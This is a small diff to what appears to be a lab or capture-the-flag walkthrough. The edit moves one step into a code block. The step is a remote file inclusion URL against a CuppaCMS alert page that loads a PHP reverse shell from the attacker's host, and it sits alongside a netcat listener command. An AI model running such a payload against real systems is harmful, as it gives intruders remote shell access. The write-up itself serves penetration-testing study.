@@ -208,7 +208,11 @@ nc -lvnp 1234
 listening on [any] 1234 ...
 ```
 
-Lastly, run the payload on the site: `http://192.168.50.109/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.10.10.2:9001/php-reverse-shell.php`
+Lastly, run the payload on the site: 
+
+```
+http://192.168.50.109/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.10.10.2:9001/php-reverse-shell.php
+```
 
 Check our `nc`, we should recieve a shell from running the payload: 
 
